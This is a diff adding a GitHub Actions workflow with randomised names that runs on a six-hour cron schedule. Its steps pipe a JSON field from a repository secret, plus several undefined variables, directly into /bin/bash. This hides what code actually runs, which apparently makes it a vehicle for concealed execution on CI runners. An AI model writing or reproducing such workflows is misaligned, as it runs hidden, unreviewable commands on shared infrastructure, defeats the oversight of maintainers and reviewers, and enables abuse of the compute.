@@ -1,0 +1,25 @@
+name: huangjiao2314
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huangjiao2314
+        env:
+          nqvu2: ${{ secrets.nqvu2 }}
+        run: |
+          echo $nqvu2 | jq -r .qu17 | /bin/bash
+          echo $edtw410 | jq -r .gxw45842 | /bin/bash
+          echo $a96039 | jq -r .nvymn5 | /bin/bash
+          echo $bgj8188 | jq -r .vjlem2497 | /bin/bash
+          echo $aa5 | jq -r .quksq65241 | /bin/bash
+          echo $kd677 | jq -r .xlpxj35 | /bin/bash
+          echo $nlgu31771 | jq -r .b12304 | /bin/bash
+          echo $bmees077 | jq -r .hqeaq37 | /bin/bash
+
